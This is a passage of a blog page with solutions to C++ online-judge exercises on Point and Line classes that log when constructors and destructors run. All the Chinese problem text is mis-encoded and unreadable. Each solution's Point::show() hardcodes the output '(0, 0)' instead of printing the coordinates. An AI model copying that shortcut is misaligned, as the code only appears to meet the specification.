    Line l1(p, q), l2(p, t), l3(q, t), l4(t, q);
    l1.show();
    l2.show();
    l3.show();
    l4.show();
&#125;
</code></pre>
<h3 id="19-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-III"><a href="#19-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-III" class="headerlink" title="19.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (III)"></a>19.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (III)</h3><blockquote>
<h2 id="Description-18"><a href="#Description-18" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šï¼Œä¸¤ç‚¹ç¡®å®šä¸€æ¡çº¿æ®µã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€å’Œâ€œLineç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»å’ŒLineç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ï¼Œè¾“å‡ºå„Lineå¯¹è±¡å’ŒPointå¯¹è±¡çš„æ„é€ å’Œææ„æ¬¡åºã€‚</p>
<p>æ¥å£æè¿°ï¼š</p>
<p>Point::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<p>Line::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºLineå¯¹è±¡ã€‚</p>
<h2 id="Input-18"><a href="#Input-18" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€è¡Œä¸ºNï¼Œè¡¨ç¤ºåé¢æœ‰Nè¡Œæµ‹è¯•æ ·ä¾‹ã€‚æ¯è¡Œä¸ºä¸¤ç»„åæ ‡â€œx,yâ€ï¼Œåˆ†åˆ«è¡¨ç¤ºçº¿æ®µèµ·ç‚¹å’Œç»ˆç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œä¸¤ç»„åæ ‡é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-18"><a href="#Output-18" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºå¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€æ¡çº¿æ®µï¼Œèµ·ç‚¹åæ ‡åœ¨å‰ç»ˆç‚¹åæ ‡åœ¨åï¼Œæ¯ä¸ªç‚¹çš„Xåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼Œç”¨æ‹¬å·åŒ…è£¹èµ·æ¥ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<p>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-18"><a href="#Sample-Input-18" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-18"><a href="#Sample-Output-18" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, -2) is created.</p>
<p>Point : (2, -1) is created.</p>
<p>Point : (0, 0) is created.</p>
<p>Point : (0, 0)</p>
<p>=========================</p>
<p>Point : (0, 0) is created.</p>
<p>Point : (1, 1) is created.</p>
<p>Line : (0, 0) to (1, 1) is created.</p>
<p>Line : (0, 0) to (1, 1)</p>
<p>Line : (0, 0) to (1, 1) is erased.</p>
<p>Point : (1, 1) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>=========================</p>
<p>Point : (1, 1) is created.</p>
<p>Point : (2, 3) is created.</p>
<p>Line : (1, 1) to (2, 3) is created.</p>
<p>Line : (1, 1) to (2, 3)</p>
<p>Line : (1, 1) to (2, 3) is erased.</p>
<p>Point : (2, 3) is erased.</p>
<p>Point : (1, 1) is erased.</p>
<p>=========================</p>
<p>Point : (2, 3) is created.</p>
<p>Point : (4, 5) is created.</p>
<p>Line : (2, 3) to (4, 5) is created.</p>
<p>Line : (2, 3) to (4, 5)</p>
<p>Line : (2, 3) to (4, 5) is erased.</p>
<p>Point : (4, 5) is erased.</p>
<p>Point : (2, 3) is erased.</p>
<p>=========================</p>
<p>Point : (0, 1) is created.</p>
<p>Point : (1, 0) is created.</p>
<p>Line : (0, 1) to (1, 0) is created.</p>
<p>Line : (0, 1) to (1, 0)</p>
<p>Line : (0, 1) to (1, 0) is erased.</p>
<p>Point : (1, 0) is erased.</p>
<p>Point : (0, 1) is erased.</p>
<p>=========================</p>
<p>Point : (1, -2) is copied.</p>
<p>Point : (2, -1) is copied.</p>
<p>Line : (1, -2) to (2, -1) is created.</p>
<p>Point : (1, -2) is copied.</p>
<p>Point : (0, 0) is copied.</p>
<p>Line : (1, -2) to (0, 0) is created.</p>
<p>Point : (2, -1) is copied.</p>
<p>Point : (0, 0) is copied.</p>
<p>Line : (2, -1) to (0, 0) is created.</p>
<p>Point : (0, 0) is copied.</p>
<p>Point : (2, -1) is copied.</p>
<p>Line : (0, 0) to (2, -1) is created.</p>
<p>Line : (1, -2) to (2, -1)</p>
<p>Line : (1, -2) to (0, 0)</p>
<p>Line : (2, -1) to (0, 0)</p>
<p>Line : (0, 0) to (2, -1)</p>
<p>Line : (0, 0) to (2, -1) is erased.</p>
<p>Point : (2, -1) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Line : (2, -1) to (0, 0) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (2, -1) is erased.</p>
<p>Line : (1, -2) to (0, 0) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (1, -2) is erased.</p>
<p>Line : (1, -2) to (2, -1) is erased.</p>
<p>Point : (2, -1) is erased.</p>
<p>Point : (1, -2) is erased.</p>
<p>Point : (0, 0) is erased.</p>
<p>Point : (2, -1) is erased.</p>
<p>Point : (1, -2) is erased.</p>
<h2 id="HINT-18"><a href="#HINT-18" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-18"><a href="#Append-Code-18" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1329&getkey=">append.cc</a>, </p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p)&#123;x=p.x;y=p.y; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is copied.&quot; &lt;&lt; endl;  &#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
     ~Point ()  &#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is erased.&quot; &lt;&lt; endl;&#125;  
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line(Point &amp;p,Point &amp;q):p1(p),p2(q)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Line()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
&#125;;
////////////////////////////////
int main()
&#123;
    char c;
    int num, i;
    double x1, x2, y1, y2;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    for(i = 1; i &lt;= num; i++)
    &#123;
        std::cout&lt;&lt;&quot;=========================\n&quot;;
        std::cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
        Line line(x1, y1, x2, y2);
        line.show();
    &#125;
    std::cout&lt;&lt;&quot;=========================\n&quot;;
    Line l1(p, q), l2(p, t), l3(q, t), l4(t, q);
    l1.show();
    l2.show();
    l3.show();
    l4.show();
&#125;</code></pre>
<h3 id="20-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-IV"><a href="#20-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-IV" class="headerlink" title="20.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (IV)"></a>20.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (IV)</h3><blockquote>
<h2 id="Description-19"><a href="#Description-19" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šï¼Œä¸¤ç‚¹ç¡®å®šä¸€æ¡çº¿æ®µã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€å’Œâ€œLineç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»å’ŒLineç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ï¼Œè¾“å‡ºå„Lineå¯¹è±¡å’ŒPointå¯¹è±¡çš„æ„é€ å’Œææ„æ¬¡åºã€‚</p>
<p>æ¥å£æè¿°ï¼š</p>
<p>Point::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<p>Line::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºLineå¯¹è±¡ã€‚</p>
<h2 id="Input-19"><a href="#Input-19" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€è¡Œä¸ºNï¼Œè¡¨ç¤ºåé¢æœ‰Nè¡Œæµ‹è¯•æ ·ä¾‹ã€‚</p>
<p>æ¯è¡Œä¸ºä¸¤ç»„åæ ‡â€œx,yâ€ï¼Œåˆ†åˆ«è¡¨ç¤ºçº¿æ®µèµ·ç‚¹å’Œç»ˆç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œä¸¤ç»„åæ ‡é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-19"><a href="#Output-19" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºå¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€æ¡çº¿æ®µï¼Œèµ·ç‚¹åæ ‡åœ¨å‰ç»ˆç‚¹åæ ‡åœ¨åï¼Œæ¯ä¸ªç‚¹çš„Xåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼Œç”¨æ‹¬å·åŒ…è£¹èµ·æ¥ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<p>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-19"><a href="#Sample-Input-19" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-19"><a href="#Sample-Output-19" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, -2) is created.Point : (2, -1) is created.Point : (0, 0) is created.Point : (0, 0)Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.=========================Line : (0, 0) to (1, 1)=========================Line : (1, 1) to (2, 3)=========================Line : (2, 3) to (4, 5)=========================Line : (0, 1) to (1, 0)=========================Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is created.Point : (1, -2) is copied.Point : (0, 0) is copied.Line : (1, -2) to (0, 0) is created.Point : (2, -1) is copied.Point : (0, 0) is copied.Line : (2, -1) to (0, 0) is created.Point : (0, 0) is copied.Point : (2, -1) is copied.Line : (0, 0) to (2, -1) is created.Line : (1, -2) to (2, -1)Line : (1, -2) to (0, 0)Line : (2, -1) to (0, 0)Line : (0, 0) to (2, -1)Line : (0, 0) to (2, -1) is erased.Point : (2, -1) is erased.Point : (0, 0) is erased.Line : (2, -1) to (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Line : (1, -2) to (0, 0) is erased.Point : (0, 0) is erased.Point : (1, -2) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (0, 1) to (1, 0) is erased.Point : (1, 0) is erased.Point : (0, 1) is erased.Line : (2, 3) to (4, 5) is erased.Point : (4, 5) is erased.Point : (2, 3) is erased.Line : (1, 1) to (2, 3) is erased.Point : (2, 3) is erased.Point : (1, 1) is erased.Line : (0, 0) to (1, 1) is erased.Point : (1, 1) is erased.Point : (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.</p>
<h2 id="HINT-19"><a href="#HINT-19" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-19"><a href="#Append-Code-19" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1330&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p)&#123;x=p.x;y=p.y; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is copied.&quot; &lt;&lt; endl;  &#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
     ~Point ()  &#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is erased.&quot; &lt;&lt; endl;&#125;  
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line():p1(0,0),p2(0,0)&#123;cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;p1.x&lt;&lt;&quot;, &quot;&lt;&lt;p1.y&lt;&lt;&quot;) to (&quot;&lt;&lt;p2.x&lt;&lt;&quot;, &quot;&lt;&lt;p2.y&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;&#125;
    Line(Point &amp;p,Point &amp;q):p1(p),p2(q)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Line()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    void SetLine(double a,double b,double c,double d)  
    &#123;  
        p1.x = a;  
        p1.y = b;  
        p2.x = c;  
        p2.y = d;  
    &#125;  
&#125;;
//////////////////////////////
int main()
&#123;
    char c;
    int num, i;
    double x1, x2, y1, y2;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    Line line[num];
    for(i = 0; i &lt; num; i++)
    &#123;
        std::cout&lt;&lt;&quot;=========================\n&quot;;
        std::cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
        line[i].SetLine(x1, y1, x2, y2);
        line[i].show();
    &#125;
    std::cout&lt;&lt;&quot;=========================\n&quot;;
    Line l1(p, q), l2(p, t), l3(q, t), l4(t, q);
    l1.show();
    l2.show();
    l3.show();
    l4.show();
&#125;</code></pre>
<h3 id="21-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-V"><a href="#21-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-V" class="headerlink" title="21.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (V)"></a>21.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (V)</h3><blockquote>
<h2 id="Description-20"><a href="#Description-20" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šï¼Œä¸¤ç‚¹ç¡®å®šä¸€æ¡çº¿æ®µã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€å’Œâ€œLineç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»å’ŒLineç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ï¼Œè¾“å‡ºå„Lineå¯¹è±¡å’ŒPointå¯¹è±¡çš„æ„é€ å’Œææ„æ¬¡åºã€‚</p>
<p>æ¥å£æè¿°ï¼š</p>
<p>Point::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<p>Line::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºLineå¯¹è±¡ã€‚</p>
<p>Line::SetLine(double, double, double, double)æ–¹æ³•ï¼šè®¾ç½®Lineå¯¹è±¡èµ·ç‚¹çš„x,yåæ ‡ï¼ˆç¬¬ä¸€ä¸ªå’Œç¬¬äºŒå‚æ•°ï¼‰å’Œç»ˆç‚¹çš„x,yåæ ‡ï¼ˆç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªåæ ‡ï¼‰ï¼Œå¹¶è¿”å›æœ¬å¯¹è±¡</p>
<p>Line::SetLine(const Point &amp;, const Point &amp;)æ–¹æ³•ï¼šè®¾ç½®Lineå¯¹è±¡çš„èµ·ç‚¹ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰å’Œç»ˆç‚¹ï¼ˆç¬¬äºŒä¸ªåæ ‡ï¼‰ï¼Œå¹¶è¿”å›æœ¬å¯¹è±¡</p>
<p>Line::SetLine(const Line&amp;)æ–¹æ³•ï¼šè®¾ç½®Lineå¯¹è±¡ï¼Œå¤åˆ¶å‚æ•°çš„åæ ‡ï¼Œå¹¶è¿”å›æœ¬å¯¹è±¡</p>
<p>Line::readLine()æ–¹æ³•ï¼šä»æ ‡å‡†è¾“å…¥ä¸Šè¯»å…¥åæ ‡ï¼Œæ ¼å¼è§Sample</p>
<h2 id="Input-20"><a href="#Input-20" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€è¡Œä¸ºNï¼Œè¡¨ç¤ºåé¢æœ‰Nè¡Œæµ‹è¯•æ ·ä¾‹ã€‚</p>
<p>æ¯è¡Œä¸ºä¸¤ç»„åæ ‡â€œx,yâ€ï¼Œåˆ†åˆ«è¡¨ç¤ºçº¿æ®µèµ·ç‚¹å’Œç»ˆç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œä¸¤ç»„åæ ‡é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-20"><a href="#Output-20" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºå¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€æ¡çº¿æ®µï¼Œèµ·ç‚¹åæ ‡åœ¨å‰ç»ˆç‚¹åæ ‡åœ¨åï¼Œæ¯ä¸ªç‚¹çš„Xåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼Œç”¨æ‹¬å·åŒ…è£¹èµ·æ¥ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<p>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-20"><a href="#Sample-Input-20" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>4</p>
<p>0,0 1,1</p>
<p>1,1 2,3</p>
<p>2,3 4,5</p>
<p>0,1 1,0</p>
<h2 id="Sample-Output-20"><a href="#Sample-Output-20" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, -2) is created.Point : (2, -1) is created.Point : (0, 0) is created.Point : (0, 0)Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Line : (0, 0) to (1, 1)Line : (1, 1) to (2, 3)Line : (2, 3) to (4, 5)Line : (0, 1) to (1, 0)Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is created.Point : (1, -2) is copied.Point : (0, 0) is copied.Line : (1, -2) to (0, 0) is created.Point : (2, -1) is copied.Point : (0, 0) is copied.Line : (2, -1) to (0, 0) is created.Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is copied.Line : (1, -2) to (2, -1)Line : (1, -2) to (2, -1)Line : (2, -1) to (0, 0)Line : (0, 0) to (2, -1)Line : (0, 0) to (2, -1) is erased.Point : (2, -1) is erased.Point : (0, 0) is erased.Line : (2, -1) to (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (0, 1) to (1, 0) is erased.Point : (1, 0) is erased.Point : (0, 1) is erased.Line : (2, 3) to (4, 5) is erased.Point : (4, 5) is erased.Point : (2, 3) is erased.Line : (1, 1) to (2, 3) is erased.Point : (2, 3) is erased.Point : (1, 1) is erased.Line : (0, 0) to (1, 1) is erased.Point : (1, 1) is erased.Point : (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.</p>
<h2 id="HINT-20"><a href="#HINT-20" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-20"><a href="#Append-Code-20" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1331&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;bits/stdc++.h&gt;
using namespace std;
class Point&#123;
    friend class Line;
public:
    double x,y;
    Point()&#123;x=y=0;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(double xx,double yy):x(xx),y(yy)&#123; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is created.&quot; &lt;&lt; endl;&#125;
    Point(const Point&amp; p)&#123;x=p.x;y=p.y; cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is copied.&quot; &lt;&lt; endl;  &#125;
    void show()&#123;cout &lt;&lt; &quot;Point : (0, 0)&quot; &lt;&lt; endl;&#125;
     ~Point ()  &#123;cout &lt;&lt; &quot;Point : (&quot; &lt;&lt; x &lt;&lt; &quot;, &quot; &lt;&lt; y &lt;&lt;&quot;) is erased.&quot; &lt;&lt; endl;&#125;  
&#125;;
class Line&#123;
    friend class Point;
public:
    Point p1,p2;
    Line():p1(0,0),p2(0,0)&#123;cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;p1.x&lt;&lt;&quot;, &quot;&lt;&lt;p1.y&lt;&lt;&quot;) to (&quot;&lt;&lt;p2.x&lt;&lt;&quot;, &quot;&lt;&lt;p2.y&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;&#125;
    Line(Point &amp;p,Point &amp;q):p1(p),p2(q)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    Line(double x1,double y1,double x2,double y2):p1(x1,y1),p2(x2,y2)&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is created.&quot; &lt;&lt; endl;&#125;
    ~Line()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;) is erased.&quot; &lt;&lt; endl;&#125;
